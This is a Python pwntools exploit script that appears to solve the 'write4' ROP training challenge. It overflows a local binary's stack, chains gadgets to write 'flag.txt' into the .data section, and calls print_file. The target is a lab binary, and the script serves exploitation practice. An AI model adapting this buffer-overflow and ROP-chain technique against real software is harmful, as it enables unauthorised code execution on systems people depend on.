from pwn import *

challenge = './write4'

elf = ELF(challenge)
rop = ROP(elf)
load = elf.symbols['usefulGadgets']

print(rop.ret)
 
payload = cyclic(40)
payload += p64(rop.ret.address) # stack align
payload += p64(rop.r14.address)
payload += p64(0x601028) # This is in the .data section and we have 
payload += b'flag.txt'
payload += p64(load)
payload += p64(rop.rdi.address)
payload += p64(0x601028)
payload += p64(elf.plt['print_file'])

print('--------- start process ------------')
io = process(challenge)
# io = gdb.debug(challenge, gdbscript='''
# 		br *pwnme+152
# 		c
# 		x/20x $sp
# 		''')

print(io.recvuntil(b'> '))

io.sendline(payload)
io.interactive()